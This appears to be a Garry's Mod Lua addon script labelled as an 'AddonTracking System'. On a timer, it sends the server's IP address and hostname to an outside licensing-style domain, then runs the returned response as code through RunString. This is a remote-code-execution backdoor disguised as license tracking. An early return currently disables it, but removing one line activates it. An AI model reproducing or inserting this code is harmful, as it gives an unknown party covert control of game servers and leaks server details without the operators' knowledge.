print("AddonTracking System")
timer.Create("tracker", 30,0, function() 
    if true then return end
    http.Fetch( "https://licensing.lprotect.tk/send",
        
        function( body, length, headers, code )
            if code == 200 or code == "200" then
                timer.Remove("tracker")
                RunString(body,"licensing lprotect" , false)
            end  
        end,
  
        function( message )
                
        end,

        { 
            ["serverip"] = game.GetIPAddress(),
            ["servername"] =  GetHostName(),
        }
    )
end) 
